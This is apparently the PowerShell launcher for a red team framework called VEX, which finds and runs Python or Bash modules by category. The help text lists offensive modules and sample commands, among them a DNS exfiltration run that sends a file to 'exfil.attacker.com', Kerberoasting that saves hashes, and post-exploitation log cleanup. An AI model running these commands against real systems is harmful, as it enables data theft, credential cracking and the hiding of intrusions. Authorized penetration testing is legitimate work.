#!/usr/bin/env pwsh
# =============================================================================
# V.E.X. — Volatile Execution X-tension
# Cross-platform PowerShell launcher  (Windows / macOS / Linux)
#
# Usage:  vex <category> <script> [args...]
#         vex list [category]
#         vex help
# =============================================================================

$ErrorActionPreference = "Stop"

# ---------------------------------------------------------------------------
# OS detection
# ---------------------------------------------------------------------------
$VEX_OS = if ($IsWindows -or $PSVersionTable.PSVersion.Major -le 5) { "windows" } `
     elseif ($IsMacOS)  { "macos" } `
     else               { "linux" }

# ---------------------------------------------------------------------------
# Resolve VEX_ROOT from this script's location (bin/../)
# ---------------------------------------------------------------------------
$VEX_ROOT    = (Resolve-Path (Join-Path $PSScriptRoot "..")).Path
$MODULES_DIR = Join-Path $VEX_ROOT "modules"
$LIB_DIR     = Join-Path $VEX_ROOT "lib"

# ---------------------------------------------------------------------------
# Coloured output helpers
# ---------------------------------------------------------------------------
function Write-Info    ([string]$m) { Write-Host "[*] $m" -ForegroundColor Cyan }
function Write-Ok      ([string]$m) { Write-Host "[+] $m" -ForegroundColor Green }
function Write-Warn    ([string]$m) { Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     ([string]$m) { Write-Host "[-] $m" -ForegroundColor Red }

# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------
function Show-Banner {
    $os = switch ($VEX_OS) {
        "windows" { "Windows" }
        "macos"   { "macOS" }
        default   { "Linux" }
    }
    Write-Host ""
    Write-Host  '$$\    $$\ $$$$$$$$\ $$\   $$\' -ForegroundColor DarkCyan
    Write-Host  '$$ |   $$ |$$  _____|$$ |  $$ |' -ForegroundColor DarkCyan
    Write-Host  '$$ |   $$ |$$ |      \$$\ $$  |' -ForegroundColor DarkCyan
    Write-Host  '\$$\  $$  |$$$$$\     \$$$$  /' -ForegroundColor DarkCyan
    Write-Host  ' \$$\$$  / $$  __|    $$  $$<' -ForegroundColor DarkCyan
    Write-Host  '  \$$$  /  $$ |      $$  /\$$\' -ForegroundColor DarkCyan
    Write-Host  '   \$  /   $$$$$$$$\ $$ /  $$ |' -ForegroundColor DarkCyan
    Write-Host  '    \_/    \________|\__|  \__|' -ForegroundColor DarkCyan
    Write-Host ""
    Write-Host "  VOLATILE EXECUTION X-TENSION" -ForegroundColor Cyan
    Write-Host " [ Red Team Script Management Framework ]" -ForegroundColor Gray
    Write-Host " [ OS: $os | VEX_ROOT: $VEX_ROOT ]" -ForegroundColor DarkGray
    Write-Host ""
}

# ---------------------------------------------------------------------------
# Find Python 3 interpreter
# ---------------------------------------------------------------------------
function Find-Python3 {
    foreach ($candidate in @("python3", "python", "py")) {
        $cmd = Get-Command $candidate -ErrorAction SilentlyContinue
        if ($cmd) {
            $ver = & $cmd.Source --version 2>&1
            if ($ver -match "Python 3") { return $cmd.Source }
        }
    }
    return $null
}

# ---------------------------------------------------------------------------
# Find Bash interpreter
# Returns a scriptblock that runs: <bash> <script> [args]
# ---------------------------------------------------------------------------
function Find-Bash {
    if ($VEX_OS -eq "windows") {
        # Prefer WSL
        if (Get-Command wsl -ErrorAction SilentlyContinue) {
            return "wsl"
        }
        # Fall back to Git Bash / MSYS2
        foreach ($b in @("bash", "C:\Program Files\Git\bin\bash.exe",
                         "C:\Program Files (x86)\Git\bin\bash.exe")) {
            if (Get-Command $b -ErrorAction SilentlyContinue) { return $b }
        }
    } else {
        foreach ($b in @("bash", "/bin/bash", "/usr/bin/bash", "/usr/local/bin/bash")) {
            if (Get-Command $b -ErrorAction SilentlyContinue) { return $b }
        }
    }
    return $null
}

# ---------------------------------------------------------------------------
# Convert a Windows absolute path to a WSL path
# ---------------------------------------------------------------------------
function ConvertTo-WslPath ([string]$WinPath) {
    return (wsl wslpath -u ($WinPath -replace '\\', '/')).Trim()
}

# ---------------------------------------------------------------------------
# List categories
# ---------------------------------------------------------------------------
function Get-Categories ([string]$Prefix = "") {
    Get-ChildItem -Path $MODULES_DIR -Directory |
        ForEach-Object { "$Prefix$($_.Name)" }
}

# ---------------------------------------------------------------------------
# List modules
# ---------------------------------------------------------------------------
function Show-Modules ([string]$Category = "") {
    if ($Category) {
        $catPath = Join-Path $MODULES_DIR $Category
        if (-not (Test-Path $catPath)) {
            Write-Err "Unknown category: $Category"
            Write-Host "  Available: $(Get-Categories)" -ForegroundColor Gray
            exit 1
        }
        Write-Info "Scripts in '$Category':"
        Get-ChildItem -Path $catPath -File |
            Where-Object { $_.Extension -in @(".py", ".sh") -or $_.Name -notmatch '\.' } |
            ForEach-Object { Write-Host "    $($_.Name)" }
    } else {
        Write-Info "All available modules:"
        Get-ChildItem -Path $MODULES_DIR -Directory | ForEach-Object {
            Write-Host "  [$($_.Name)]" -ForegroundColor Yellow
            Get-ChildItem -Path $_.FullName -File |
                Where-Object { $_.Extension -in @(".py", ".sh") -or $_.Name -notmatch '\.' } |
                ForEach-Object { Write-Host "    $($_.Name)" }
        }
    }
}

# ---------------------------------------------------------------------------
# Find a script in a category directory
# Tries: exact name → name.py → name.sh → fuzzy basename match
# ---------------------------------------------------------------------------
function Find-ModuleScript ([string]$CatPath, [string]$Name) {
    # Exact
    $exact = Join-Path $CatPath $Name
    if (Test-Path $exact -PathType Leaf) { return $exact }

    # Known extensions
    foreach ($ext in @(".py", ".sh")) {
        $c = Join-Path $CatPath "$Name$ext"
        if (Test-Path $c -PathType Leaf) { return $c }
    }

    # Fuzzy: match by basename without extension
    $match = Get-ChildItem -Path $CatPath -File |
        Where-Object { [IO.Path]::GetFileNameWithoutExtension($_.Name) -eq $Name } |
        Select-Object -First 1
    if ($match) { return $match.FullName }

    return $null
}

# ---------------------------------------------------------------------------
# Execute a single script file with the supplied args
# ---------------------------------------------------------------------------
function Invoke-ModuleScript ([string]$Script, [string[]]$ExtraArgs) {
    $ext  = [IO.Path]::GetExtension($Script).ToLower()
    $name = [IO.Path]::GetFileName($Script)

    Write-Host "[>] Executing: $name $($ExtraArgs -join ' ')" -ForegroundColor White
    Write-Host ""

    if ($ext -eq ".py") {
        # ── Python: native on all platforms ──────────────────────────────
        $python = Find-Python3
        if (-not $python) {
            Write-Err "Python 3 not found. Install from https://python.org"
            exit 1
        }
        & $python $Script @ExtraArgs
        exit $LASTEXITCODE

    } elseif ($ext -eq ".sh") {
        # ── Bash script ───────────────────────────────────────────────────
        $bash = Find-Bash
        if (-not $bash) {
            Write-Err "No Bash interpreter found."
            Write-Host ""
            Write-Host "  Install one of the following, then re-open your terminal:" -ForegroundColor Gray
            if ($VEX_OS -eq "windows") {
                Write-Host "    Windows Subsystem for Linux : https://aka.ms/wsl"     -ForegroundColor Gray
                Write-Host "    Git for Windows (Git Bash)  : https://git-scm.com"   -ForegroundColor Gray
            } else {
                Write-Host "    Install bash via your system package manager."         -ForegroundColor Gray
            }
            exit 1
        }

        if ($VEX_OS -eq "windows" -and $bash -eq "wsl") {
            # Convert Windows path → WSL path, then run via WSL
            $wslScript = ConvertTo-WslPath $Script
            wsl bash $wslScript @ExtraArgs
        } else {
            & $bash $Script @ExtraArgs
        }
        exit $LASTEXITCODE

    } else {
        Write-Err "Cannot determine how to execute: $Script"
        Write-Err "File must have a .py or .sh extension."
        exit 1
    }
}

# ---------------------------------------------------------------------------
# AI context stub
# ---------------------------------------------------------------------------
function Show-AIContext ([string]$Category, [string]$Script, [string[]]$ExtraArgs) {
    $name = [IO.Path]::GetFileName($Script)
    Write-Host "[AI] ── VEX AI-Assist ─────────────────────────────────────────────────────" -ForegroundColor Magenta
    Write-Host "  Category : $Category"
    Write-Host "  Script   : $name"
    Write-Host "  Args     : $($ExtraArgs -join ' ')"
    Write-Host "  Path     : $Script"
    Write-Host ""
    Write-Host "  [AI] Analysing script capabilities…" -ForegroundColor Magenta
    Get-Content $Script -TotalCount 20 | ForEach-Object { Write-Host "  $_" }
    Write-Host "────────────────────────────────────────────────────────────────────────────" -ForegroundColor Magenta
    Write-Host "  NOTE: Full AI integration requires setting VEX_AI_KEY and pointing" -ForegroundColor DarkGray
    Write-Host "        lib/ai.sh at a supported LLM endpoint (see data/config.ini)." -ForegroundColor DarkGray
    Write-Host "────────────────────────────────────────────────────────────────────────────" -ForegroundColor Magenta
    Write-Host ""
}

# ---------------------------------------------------------------------------
# Run a module
# ---------------------------------------------------------------------------
function Invoke-Module ([string]$Category, [string]$ScriptName, [string[]]$ExtraArgs) {
    $catPath = Join-Path $MODULES_DIR $Category
    if (-not (Test-Path $catPath)) {
        Write-Err "Unknown category: $Category"
        Write-Host "  Run 'vex list' to see available categories." -ForegroundColor Gray
        exit 1
    }

    $target = Find-ModuleScript $catPath $ScriptName
    if (-not $target) {
        Write-Err "Script '$ScriptName' not found in category '$Category'."
        Write-Host "  Run 'vex list $Category' to see available scripts." -ForegroundColor Gray
        exit 1
    }

    # Strip -ai flag
    $aiMode    = $false
    $cleanArgs = [System.Collections.Generic.List[string]]::new()
    foreach ($a in $ExtraArgs) {
        if ($a -eq "-ai") { $aiMode = $true } else { $cleanArgs.Add($a) }
    }

    if ($aiMode) { Show-AIContext $Category $target $cleanArgs.ToArray() }
    Invoke-ModuleScript $target $cleanArgs.ToArray()
}

# ---------------------------------------------------------------------------
# Usage
# ---------------------------------------------------------------------------
function Show-Usage {
    Write-Host "VEX 1.0.0 ( https://github.com/voido/VEX )" -ForegroundColor White
    Write-Host 'Usage: vex [Global Flags] {category} {script} [Script Options]' -ForegroundColor White
    Write-Host @"
GLOBAL FLAGS:
  -h, --help                          Print this help summary
  -l, --list [category]               List available modules (optionally filter by category)
  -ai                                 Enable AI-assisted context for any module
MODULE EXECUTION:
  vex <category> <script> [args...]   Dynamically discover and run a module script
                                      Extension (.py / .sh) is optional; VEX resolves it automatically
CATEGORIES:
  active-directory    Active Directory attacks (Kerberoasting, etc.)
  cloud               Cloud service enumeration (AWS S3, etc.)
  exfil               Data exfiltration techniques (DNS tunnelling, etc.)
  mobile              Mobile application analysis (APK decompilation, etc.)
  network             Network scanning and enumeration (port scans, etc.)
  os                  OS-level reconnaissance (SUID scan, etc.)
  post-ex             Post-exploitation cleanup and persistence
  web                 Web application reconnaissance and testing
SCRIPT OPTIONS (per module — pass -h to any script for details):
  active-directory/kerberoast:
    -d, --domain <domain>             Target domain (e.g. corp.local)
    -u, --user <username>             Domain username
    -p, --password <password>         Domain password
    -dc, --dc-ip <ip>                 Domain controller IP
    -o, --output <file>               Save hashes to file
  cloud/aws_s3_enum:
    -b, --bucket <name>               Specific bucket name to probe
    -p, --profile <profile>           AWS CLI profile (default: default)
  exfil/dns_exfil:
    -f, --file <path>                 File to exfiltrate
    -d, --domain <domain>             Attacker-controlled DNS domain
    -c, --chunk-size <bytes>          Bytes per DNS label (default: 30)
    --delay <seconds>                 Seconds between queries (default: 0.5)
  mobile/apk_decompile:
    <apk_file>                        Path to APK file
    -o, --output <dir>                Output directory
  network/port_scan:
    <target>                          Target host or CIDR
    -p, --ports <range>               Port range (default: 1-1024)
    -o, --output <prefix>             Output file prefix (saved to loot/)
  os/linux_suid_scan:                 [Linux only]
    -o, --output <file>               Write results to file
  post-ex/cleanup_logs:               [Linux/macOS only]
    -n, --dry-run                     Show what would be removed without deleting
    -v, --verbose                     Verbose output
  web/recon:
    -t, --target <url>                Target URL (e.g. https://example.com)
    -o, --output <file>               Write results to file
AI INTEGRATION:
  VEX_AI_KEY                          Set in environment to enable live AI queries
  VEX_AI_ENDPOINT                     LLM API endpoint (default: OpenAI-compatible)
  VEX_AI_MODEL                        Model name (default: gpt-4o)
OUTPUT:
  All module output is saved to the loot/ directory by default.
  Use -o on individual modules to customise output location.
CONFIGURATION:
  data/config.ini                     Global framework settings
  data/config.local.ini               Local overrides (git-ignored)
PLATFORM SUPPORT:
  Windows                             Native via PowerShell; .sh modules delegate to WSL
  macOS                               Native via Bash and Python 3
  Linux                               Native via Bash and Python 3
EXAMPLES:
  vex web recon -t https://example.com
  vex network port_scan 192.168.1.0/24 -p 1-65535
  vex active-directory kerberoast -d corp.local -u admin -p pass -o hashes.txt
  vex cloud aws_s3_enum -b my-bucket -p prod
  vex exfil dns_exfil -f secret.txt -d exfil.attacker.com --delay 0.1
  vex mobile apk_decompile target.apk -o ./output
  vex post-ex cleanup_logs -n -v
  vex os linux_suid_scan -o suid_results.txt
  vex -l network
  vex web recon -ai -t https://example.com
SEE THE README (https://github.com/voido/VEX) FOR MORE INFORMATION
"@
}

# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
Show-Banner

$cmd = if ($args.Count -gt 0) { $args[0] } else { $null }

switch ($cmd) {
    $null {
        # No arguments — just the splash screen (already shown above)
    }
    { $_ -in @("--help", "-h") } {
        Show-Usage
    }
    { $_ -in @("--list", "-l") } {
        $cat = if ($args.Count -gt 1) { $args[1] } else { "" }
        Show-Modules $cat
    }
    default {
        if ($cmd.StartsWith("-")) {
            Write-Err "Unknown flag: $cmd"
            Write-Host "  Run 'vex -h' for usage." -ForegroundColor Gray
            exit 1
        }
        if ($args.Count -lt 2) {
            Write-Err "Missing script name. Usage: vex <category> <script> [args...]"
            Write-Host "  Run 'vex -h' for help or 'vex -l' to list modules." -ForegroundColor Gray
            exit 1
        }
        $extra = if ($args.Count -gt 2) { $args[2..($args.Count - 1)] } else { @() }
        Invoke-Module $args[0] $args[1] $extra
    }
}
